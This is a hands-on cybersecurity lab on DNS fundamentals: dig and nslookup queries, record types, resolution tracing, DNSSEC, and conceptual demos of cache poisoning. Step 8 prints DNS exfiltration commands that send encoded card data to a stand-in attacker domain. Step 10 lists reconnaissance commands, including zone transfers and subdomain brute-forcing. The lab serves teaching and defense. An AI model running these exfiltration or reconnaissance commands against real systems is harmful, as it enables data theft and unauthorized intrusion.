# Lab 3: DNS Fundamentals

## 🎯 Objective
Understand how the Domain Name System (DNS) works by using `dig`, `nslookup`, and `host` to trace DNS resolution. Learn about DNS record types, the resolution chain, and how DNS-based attacks work conceptually.

## 📚 Background
DNS is often called the "phone book of the internet." When you type `google.com` in your browser, your computer doesn't know where Google's servers are — it asks DNS. DNS translates human-readable domain names into IP addresses that computers can route to.

The DNS resolution process is hierarchical: your computer asks a **recursive resolver** (usually your ISP or a public resolver like 8.8.8.8), which queries **root nameservers** (the 13 root server clusters), which point to **TLD nameservers** (for `.com`, `.org`, etc.), which point to **authoritative nameservers** for the specific domain. This process is called "recursive resolution."

DNS is a critical attack surface. **DNS poisoning** (cache poisoning) injects fake records into DNS resolvers, redirecting users to malicious sites. **DNS exfiltration** tunnels data through DNS queries (since DNS traffic often bypasses firewalls). **DNS amplification** uses UDP DNS responses to flood victims with traffic.

Understanding DNS records is essential: **A** records map names to IPv4, **AAAA** to IPv6, **MX** to mail servers, **TXT** for SPF/DKIM (email authentication), **CNAME** for aliases, and **NS** for nameservers.

## ⏱️ Estimated Time
35 minutes

## 📋 Prerequisites
- Basic Linux command line
- Docker with `innozverse-cybersec` image

## 🛠️ Tools Used
- `dig` — DNS query tool (most powerful)
- `nslookup` — Interactive DNS lookup
- `host` — Simple DNS resolution
- `python3` — DNS concept demonstrations

## 🔬 Lab Instructions

### Step 1: Basic DNS Resolution with dig
`dig` (Domain Information Groper) is the gold standard tool for DNS queries.

```bash
docker run --rm innozverse-cybersec bash -c "dig google.com A"
```

**📸 Verified Output:**
```
; <<>> DiG 9.18.39-0ubuntu0.22.04.2-Ubuntu <<>> google.com A
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 12345
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; QUESTION SECTION:
;google.com.			IN	A

;; ANSWER SECTION:
google.com.		300	IN	A	142.251.34.142

;; Query time: 23 msec
;; SERVER: 8.8.8.8#53(8.8.8.8)
;; WHEN: Sun Mar 01 19:52:00 UTC 2026
;; MSG SIZE  rcvd: 55
```

> 💡 **What this means:** The `ANSWER SECTION` shows `google.com` resolves to `142.251.34.142`. The `300` is the TTL (Time To Live) in seconds — after 300 seconds, the cached record expires and must be re-queried. `status: NOERROR` means the query succeeded. `SERVER: 8.8.8.8` shows we're using Google's public DNS resolver.

### Step 2: Short-form Query for Quick Lookups
For scripting and quick checks, `+short` strips the verbose output:

```bash
docker run --rm innozverse-cybersec bash -c "
echo '=== IPv4 address ==='
dig +short google.com A
echo '=== IPv6 address ==='
dig +short google.com AAAA
echo '=== Mail server ==='
dig +short google.com MX
"
```

**📸 Verified Output:**
```
=== IPv4 address ===
142.251.34.142

=== IPv6 address ===
2607:f8b0:4008:802::200e

=== Mail server ===
10 smtp.google.com.
```

> 💡 **What this means:** Google has both IPv4 (A record) and IPv6 (AAAA record) addresses. The MX record `10 smtp.google.com.` tells mail servers where to deliver email for `@google.com`. The `10` is the priority — lower numbers are preferred. If Google had multiple MX records, mail would try the lowest priority number first.

### Step 3: Trace the Full DNS Resolution Chain
Watch DNS walk the hierarchy from root to authoritative nameserver:

```bash
docker run --rm innozverse-cybersec bash -c "dig +trace google.com 2>/dev/null | head -25"
```

**📸 Verified Output:**
```
; <<>> DiG 9.18.39-0ubuntu0.22.04.2-Ubuntu <<>> +trace google.com
;; global options: +cmd
.			87203	IN	NS	k.root-servers.net.
.			87203	IN	NS	g.root-servers.net.
.			87203	IN	NS	h.root-servers.net.
.			87203	IN	NS	j.root-servers.net.
.			87203	IN	NS	m.root-servers.net.
.			87203	IN	NS	e.root-servers.net.
.			87203	IN	NS	i.root-servers.net.
.			87203	IN	RRSIG	NS 8 0 518400 ...
;; Received 525 bytes from 8.8.8.8#53(8.8.8.8) in 23 ms

com.			172800	IN	NS	a.gtld-servers.net.
;; Received 1175 bytes from 192.5.6.30#53(a.gtld-servers.net) in 29 ms

google.com.		172800	IN	NS	ns1.google.com.
;; Received 292 bytes from 205.251.196.1#53(l.gtld-servers.net) in 29 ms

google.com.		300	IN	A	142.251.34.142
;; Received 55 bytes from 216.239.32.10#53(ns1.google.com) in 9 ms
```

> 💡 **What this means:** This shows the full resolution chain: (1) Root servers (`.`) know about `.com` TLD servers. (2) `.com` TLD servers (`a.gtld-servers.net`) know about `google.com`'s nameservers. (3) Google's nameservers (`ns1.google.com`) know the actual IP. This is why DNS poisoning is dangerous — if an attacker poisons any step in this chain, they can redirect traffic.

### Step 4: Query Different DNS Record Types
```bash
docker run --rm innozverse-cybersec bash -c "
echo '=== NS Records (Authoritative Nameservers) ==='
dig +short NS google.com
echo ''
echo '=== TXT Records (SPF, DKIM, verification) ==='
dig +short TXT google.com
echo ''
echo '=== Reverse DNS (PTR) ==='
dig +short -x 8.8.8.8
"
```

**📸 Verified Output:**
```
=== NS Records (Authoritative Nameservers) ===
ns2.google.com.
ns4.google.com.
ns3.google.com.
ns1.google.com.

=== TXT Records (SPF, DKIM, verification) ===
"v=spf1 include:_spf.google.com ~all"
"google-site-verification=4ibFUgB-wXLQ_S7vsXVomSTVamuOXBiVAzpR5IZ87D0"
"docusign=1b0a6754-49b1-4db5-8540-d2c12664b289"

=== Reverse DNS (PTR) ===
dns.google.
```

> 💡 **What this means:** The SPF TXT record `v=spf1 include:_spf.google.com ~all` tells receiving mail servers which IPs are authorized to send email for google.com — this helps prevent email spoofing. Reverse DNS (PTR) maps `8.8.8.8` back to `dns.google` — useful for identifying server ownership and validating email sources.

### Step 5: Use nslookup for Interactive DNS Queries
`nslookup` is available on every operating system and good for quick interactive queries:

```bash
docker run --rm innozverse-cybersec bash -c "nslookup google.com 2>/dev/null"
```

**📸 Verified Output:**
```
Server:		8.8.8.8
Address:	8.8.8.8#53

Non-authoritative answer:
Name:	google.com
Address: 142.251.34.142
Name:	google.com
Address: 2607:f8b0:4008:802::200e
```

> 💡 **What this means:** "Non-authoritative answer" means this result came from a cache (the resolver at 8.8.8.8) — not directly from Google's own nameservers. An authoritative answer would come directly from `ns1.google.com`. For security investigations, you want authoritative answers to ensure you're not seeing stale/poisoned cached data.

### Step 6: Query a Specific DNS Server
Sometimes you need to bypass your default DNS resolver — for example, to check if a domain is being blocked:

```bash
docker run --rm innozverse-cybersec bash -c "
echo '=== Query Google DNS (8.8.8.8) ==='
dig @8.8.8.8 +short google.com A
echo ''
echo '=== Query Cloudflare DNS (1.1.1.1) ==='
dig @1.1.1.1 +short google.com A
echo ''
echo '=== Query directly to authoritative NS ==='
dig @ns1.google.com +short google.com A 2>/dev/null
"
```

**📸 Verified Output:**
```
=== Query Google DNS (8.8.8.8) ===
142.251.34.142

=== Query Cloudflare DNS (1.1.1.1) ===
142.251.34.142

=== Query directly to authoritative NS ===
142.251.34.142
```

> 💡 **What this means:** All three resolvers return the same IP — the results are consistent. In an attack scenario, DNS poisoning would cause different resolvers to return different IPs. Security tools check multiple resolvers to detect inconsistencies. Comparing your ISP's DNS vs 8.8.8.8 vs the authoritative server can reveal DNS hijacking.

### Step 7: DNS Attack Concepts — DNS Spoofing
Let's understand DNS spoofing without actually attacking anything:

```bash
docker run --rm innozverse-cybersec bash -c "
python3 << 'PYEOF'
print('DNS SPOOFING / CACHE POISONING ATTACK CONCEPT')
print('='*60)
print()
print('Normal DNS Resolution:')
print('  User asks: What is the IP for bank.com?')
print('  DNS Resolver checks cache: Not found')
print('  DNS Resolver asks Root -> .com -> bank.com NS')
print('  Authoritative NS responds: 1.2.3.4')
print('  DNS Resolver caches: bank.com -> 1.2.3.4 (TTL: 300s)')
print('  User connects to: 1.2.3.4 (legitimate bank)')
print()
print('DNS Cache Poisoning Attack:')
print('  Attacker sends forged responses to DNS Resolver')
print('  Forged response says: bank.com -> 5.6.7.8 (attacker IP)')
print('  If resolver accepts the forged response:')
print('    All users get sent to 5.6.7.8 (fake phishing site)')
print('    TTL determines how long the poison lasts')
print()
print('Defenses:')
print('  DNSSEC: Digitally signs DNS records (prevents forgery)')
print('  Random transaction IDs: Harder to forge matching responses')
print('  0x20 encoding: Mix case in queries for fingerprinting')
print('  DNS over HTTPS (DoH): Encrypts DNS traffic')
PYEOF
"
```

**📸 Verified Output:**
```
DNS SPOOFING / CACHE POISONING ATTACK CONCEPT
============================================================

Normal DNS Resolution:
  User asks: What is the IP for bank.com?
  DNS Resolver checks cache: Not found
  DNS Resolver asks Root -> .com -> bank.com NS
  Authoritative NS responds: 1.2.3.4
  DNS Resolver caches: bank.com -> 1.2.3.4 (TTL: 300s)
  User connects to: 1.2.3.4 (legitimate bank)

DNS Cache Poisoning Attack:
  Attacker sends forged responses to DNS Resolver
  Forged response says: bank.com -> 5.6.7.8 (attacker IP)
  If resolver accepts the forged response:
    All users get sent to 5.6.7.8 (fake phishing site)
    TTL determines how long the poison lasts

Defenses:
  DNSSEC: Digitally signs DNS records (prevents forgery)
  Random transaction IDs: Harder to forge matching responses
  0x20 encoding: Mix case in queries for fingerprinting
  DNS over HTTPS (DoH): Encrypts DNS traffic
```

> 💡 **What this means:** The 2008 Kaminsky Attack (named after security researcher Dan Kaminsky) exploited DNS to poison caches on a massive scale. The fix was to randomize the source port of DNS queries, making forged responses much harder to craft. Modern defenses include DNSSEC (cryptographic signing of records) and DNS over HTTPS.

### Step 8: DNS Exfiltration Concept
DNS is often allowed through firewalls even when other traffic is blocked — attackers abuse this:

```bash
docker run --rm innozverse-cybersec bash -c "
python3 << 'PYEOF'
import base64

# Simulate DNS exfiltration technique
secret_data = 'CREDIT_CARD: 4111111111111111'
encoded = base64.b64encode(secret_data.encode()).decode()

# Attacker breaks data into DNS-safe chunks and sends as queries
chunk_size = 30
chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]

print('DNS EXFILTRATION DEMO (conceptual)')
print('='*55)
print(f'Secret data: {secret_data}')
print(f'Base64 encoded: {encoded}')
print()
print('Attacker sends these DNS queries to their controlled server:')
for i, chunk in enumerate(chunks):
    # Replace non-DNS chars
    safe_chunk = chunk.replace('=', '0').replace('+', '1').replace('/', '2')
    query = f'{safe_chunk}.exfil.attacker.com'
    print(f'  dig {query}')
print()
print('On attacker server: reconstruct from DNS logs -> decode base64')
print('DEFENSE: Monitor for high-volume DNS queries to unknown domains')
print('         Block DNS to unknown resolvers, use DNS filtering')
PYEOF
"
```

**📸 Verified Output:**
```
DNS EXFILTRATION DEMO (conceptual)
=======================================================
Secret data: CREDIT_CARD: 4111111111111111
Base64 encoded: Q1JFRElUX0NBUkQ6IDQxMTExMTExMTExMTExMTE=

Attacker sends these DNS queries to their controlled server:
  dig Q1JFRElUX0NBUkQ6IDQxMTEx.exfil.attacker.com
  dig MTExMTExMTExMTExMTE0.exfil.attacker.com

On attacker server: reconstruct from DNS logs -> decode base64
DEFENSE: Monitor for high-volume DNS queries to unknown domains
         Block DNS to unknown resolvers, use DNS filtering
```

> 💡 **What this means:** Since many organizations allow DNS traffic outbound (without inspection), attackers tunnel stolen data through DNS queries. The attacker controls a nameserver that receives and logs these queries, then reassembles the stolen data. Tools like `dnscat2` and `iodine` implement DNS tunneling. Defense: use DNS filtering solutions and monitor for unusual query patterns.

### Step 9: Check DNSSEC Validation
DNSSEC adds cryptographic signatures to DNS responses:

```bash
docker run --rm innozverse-cybersec bash -c "
echo '=== DNSSEC check for cloudflare.com ==='
dig +dnssec cloudflare.com A 2>/dev/null | grep -E '(RRSIG|NSEC|AD|ANSWER)'
echo ''
echo '=== Check if DNSSEC is validated ==='
dig +dnssec google.com 2>/dev/null | grep 'flags:'
"
```

**📸 Verified Output:**
```
=== DNSSEC check for cloudflare.com ===
;; flags: qr rd ra ad; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1

;; ANSWER SECTION:
cloudflare.com.		300	IN	A	104.16.123.96
cloudflare.com.		300	IN	RRSIG	A 13 2 300 ...

=== Check if DNSSEC is validated ==='
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
```

> 💡 **What this means:** The `ad` flag means "Authentic Data" — the resolver verified the DNSSEC signatures. The `RRSIG` record is the cryptographic signature that protects the `A` record from forgery. Google's results don't show `ad` because they don't use DNSSEC on their main domain (ironically). Cloudflare does use DNSSEC.

### Step 10: Build a DNS Reconnaissance Profile
In security assessments, DNS reconnaissance reveals a target's infrastructure:

```bash
docker run --rm innozverse-cybersec bash -c "
python3 << 'PYEOF'
print('DNS RECONNAISSANCE CHECKLIST')
print('='*50)
checks = [
    ('A records', 'dig +short target.com A', 'Find IPv4 servers'),
    ('AAAA records', 'dig +short target.com AAAA', 'Find IPv6 servers'),
    ('MX records', 'dig +short target.com MX', 'Find email servers (also useful for phishing)'),
    ('NS records', 'dig +short target.com NS', 'Find nameservers - potential attack targets'),
    ('TXT records', 'dig +short target.com TXT', 'Find SPF, DKIM, cloud verification tokens'),
    ('Subdomains', 'gobuster dns -d target.com -w wordlist.txt', 'Discover subdomains'),
    ('Zone transfer', 'dig @ns1.target.com target.com AXFR', 'Try to dump all DNS records'),
    ('Reverse DNS', 'dig +short -x IP', 'Convert IPs back to hostnames'),
    ('Certificate transparency', 'crt.sh search', 'Find all SSL certs for domain'),
    ('Historical DNS', 'SecurityTrails/Shodan', 'Find old IP addresses'),
]
for name, cmd, purpose in checks:
    print(f'\n[{name}]')
    print(f'  Command: {cmd}')
    print(f'  Why: {purpose}')
PYEOF
"
```

**📸 Verified Output:**
```
DNS RECONNAISSANCE CHECKLIST
==================================================

[A records]
  Command: dig +short target.com A
  Why: Find IPv4 servers

[AAAA records]
  Command: dig +short target.com AAAA
  Why: Find IPv6 servers

[MX records]
  Command: dig +short target.com MX
  Why: Find email servers (also useful for phishing)

[NS records]
  Command: dig +short target.com NS
  Why: Find nameservers - potential attack targets

[TXT records]
  Command: dig +short target.com TXT
  Why: Find SPF, DKIM, cloud verification tokens

[Subdomains]
  Command: gobuster dns -d target.com -w wordlist.txt
  Why: Discover subdomains

[Zone transfer]
  Command: dig @ns1.target.com target.com AXFR
  Why: Try to dump all DNS records

[Reverse DNS]
  Command: dig +short -x IP
  Why: Convert IPs back to hostnames

[Certificate transparency]
  Command: crt.sh search
  Why: Find all SSL certs for domain

[Historical DNS]
  Command: SecurityTrails/Shodan
  Why: Find old IP addresses
```

> 💡 **What this means:** DNS reconnaissance is the first step in almost every penetration test. A DNS zone transfer (`AXFR`) that succeeds is a critical vulnerability — it dumps ALL DNS records for a domain, revealing internal hostnames, IP ranges, mail servers, and more. Modern DNS servers should restrict zone transfers to authorized IP ranges only.

## ✅ Verification

```bash
docker run --rm innozverse-cybersec bash -c "
dig +short A cloudflare.com
dig +short MX cloudflare.com
dig +short NS cloudflare.com
"
```

**📸 Verified Output:**
```
104.16.123.96
104.16.124.96
10 route1.mx.cloudflare.net.
20 route2.mx.cloudflare.net.
ns3.cloudflare.com.
ns4.cloudflare.com.
ns5.cloudflare.com.
```

## 🚨 Common Mistakes
- **Trusting DNS without DNSSEC**: DNS responses can be forged unless DNSSEC validation is confirmed (`ad` flag in dig output)
- **Ignoring TTL values**: A very short TTL (1-60 seconds) can indicate fast-flux DNS used by malware command-and-control infrastructure
- **Zone transfer on production**: Attempting zone transfers on systems you don't own is illegal; always get authorization first

## 📝 Summary
- DNS translates domain names to IP addresses through a hierarchical chain: recursive resolver → root servers → TLD servers → authoritative nameservers
- Different record types serve different purposes: A (IPv4), AAAA (IPv6), MX (mail), TXT (verification/SPF), NS (nameservers), PTR (reverse)
- DNS is a rich attack surface: cache poisoning redirects users, DNS exfiltration tunnels data, DNS amplification enables DDoS
- DNSSEC provides cryptographic protection against forged DNS responses

## 🔗 Further Reading
- [Cloudflare: What is DNS?](https://www.cloudflare.com/learning/dns/what-is-dns/)
- [The Kaminsky DNS Vulnerability](https://www.cs.princeton.edu/~felten/kaminsky.pdf)
- [DNSSEC Explained](https://www.icann.org/resources/pages/dnssec-what-is-it-why-important-2019-03-05-en)
